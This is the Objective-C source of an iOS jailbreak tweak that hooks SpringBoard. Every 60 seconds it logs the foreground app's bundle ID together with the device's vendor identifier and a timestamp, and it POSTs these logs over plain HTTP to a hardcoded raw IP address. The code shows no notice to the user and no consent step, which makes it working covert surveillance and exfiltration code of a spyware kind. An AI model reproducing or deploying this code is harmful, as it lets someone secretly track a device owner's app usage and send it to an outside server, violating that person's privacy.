#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <SpringBoard/SpringBoard.h>

// Configuration
static NSString *API_ENDPOINT = @"http://186.190.215.38:3000/screenshots/log";
static NSString *DEVICE_ID = nil;
static NSMutableArray *systemLogs = nil;

// Declare interfaces
@interface SBApplication : NSObject
- (NSString *)bundleIdentifier;
@end

@interface SBApplicationController : NSObject
+ (id)sharedInstance;
- (SBApplication *)frontmostApplication;
@end

@interface SpringBoard (ScreenshotMonitor)
- (void)logSystemActivity;
- (void)sendLogsToServer;
- (NSString *)getCurrentApp;
@end

%hook SpringBoard

-(void)applicationDidFinishLaunching:(id)application {
    %orig;
    
    // Initialize logs array
    if (!systemLogs) {
        systemLogs = [NSMutableArray new];
    }
    
    // Get device ID if not set
    if (!DEVICE_ID) {
        DEVICE_ID = [[[UIDevice currentDevice] identifierForVendor] UUIDString];
    }
    
    // Single timer for both logging and sending (every 60 seconds)
    [NSTimer scheduledTimerWithTimeInterval:60.0
                                   target:self
                                 selector:@selector(logSystemActivity)
                                 userInfo:nil
                                  repeats:YES];
    
    NSLog(@"[SystemMonitor] Initialized with endpoint: %@", API_ENDPOINT);
}

%new
-(NSString *)getCurrentApp {
    @try {
        SBApplicationController *appController = [%c(SBApplicationController) sharedInstance];
        if (!appController) return @"unknown";
        
        SBApplication *frontApp = [appController frontmostApplication];
        return frontApp ? [frontApp bundleIdentifier] : @"unknown";
    } @catch (NSException *exception) {
        return @"unknown";
    }
}

%new
-(void)logSystemActivity {
    @try {
        // Get current app
        NSString *currentApp = [self getCurrentApp];
        if ([currentApp isEqualToString:@"unknown"]) return;
        
        // Create timestamp
        NSString *timestamp = [[NSDate date] description];
        
        // Create log entry
        NSString *logEntry = [NSString stringWithFormat:@"%@|%@|%@", DEVICE_ID, timestamp, currentApp];
        
        // Add to logs array and send immediately
        [systemLogs addObject:logEntry];
        
        // Send logs if we have any
        [self sendLogsToServer];
        
        NSLog(@"[SystemMonitor] App logged: %@", currentApp);
    } @catch (NSException *exception) {
        NSLog(@"[SystemMonitor] Error logging activity: %@", exception);
    }
}

%new
-(void)sendLogsToServer {
    if (systemLogs.count == 0) return;
    
    @try {
        // Create text payload
        NSString *payload = [systemLogs componentsJoinedByString:@"\n"];
        
        // Create request
        NSURL *url = [NSURL URLWithString:API_ENDPOINT];
        NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
        [request setHTTPMethod:@"POST"];
        [request setValue:@"text/plain" forHTTPHeaderField:@"Content-Type"];
        [request setHTTPBody:[payload dataUsingEncoding:NSUTF8StringEncoding]];
        
        // Send request
        [[[NSURLSession sharedSession] dataTaskWithRequest:request 
                                       completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
            if (!error && [(NSHTTPURLResponse *)response statusCode] == 200) {
                [systemLogs removeAllObjects];
                NSLog(@"[SystemMonitor] Logs sent successfully");
            }
        }] resume];
    } @catch (NSException *exception) {
        NSLog(@"[SystemMonitor] Error sending logs: %@", exception);
    }
}

%end

// Required constructor
%ctor {
    @autoreleasepool {
        NSLog(@"[SystemMonitor] Tweak loaded");
    }
}